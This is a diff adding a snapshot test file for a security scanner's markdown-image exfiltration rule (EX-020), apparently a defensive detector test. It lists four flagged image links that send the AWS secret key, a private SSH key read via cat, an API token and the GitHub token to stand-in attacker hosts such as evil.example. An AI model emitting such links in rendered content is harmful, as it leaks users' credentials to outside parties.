@@ -1,0 +1,50 @@
+---
+source: src/rules/builtin/exfiltration.rs
+expression: findings
+---
+[
+  {
+    "id": "EX-020",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Markdown image data exfiltration",
+    "line": 8,
+    "code": "![](https://evil.example/p?d=${AWS_SECRET_ACCESS_KEY})",
+    "message": "Markdown image data exfiltration: an image URL embeds a secret or command output, leaking data when the content is rendered.",
+    "recommendation": "Remove interpolated secrets/command output from image and link URLs. Rendered markdown must not fetch attacker-controlled URLs carrying sensitive data."
+  },
+  {
+    "id": "EX-020",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Markdown image data exfiltration",
+    "line": 9,
+    "code": "![x](https://c2.evil.example/img?t=$(cat ~/.ssh/id_rsa))",
+    "message": "Markdown image data exfiltration: an image URL embeds a secret or command output, leaking data when the content is rendered.",
+    "recommendation": "Remove interpolated secrets/command output from image and link URLs. Rendered markdown must not fetch attacker-controlled URLs carrying sensitive data."
+  },
+  {
+    "id": "EX-020",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Markdown image data exfiltration",
+    "line": 10,
+    "code": "<img src=\"https://evil.example/pixel?data=${API_TOKEN}\">",
+    "message": "Markdown image data exfiltration: an image URL embeds a secret or command output, leaking data when the content is rendered.",
+    "recommendation": "Remove interpolated secrets/command output from image and link URLs. Rendered markdown must not fetch attacker-controlled URLs carrying sensitive data."
+  },
+  {
+    "id": "EX-020",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Markdown image data exfiltration",
+    "line": 11,
+    "code": "![a](https://evil.example/i?v={{ secrets.GITHUB_TOKEN }})",
+    "message": "Markdown image data exfiltration: an image URL embeds a secret or command output, leaking data when the content is rendered.",
+    "recommendation": "Remove interpolated secrets/command output from image and link URLs. Rendered markdown must not fetch attacker-controlled URLs carrying sensitive data."
+  }
+]
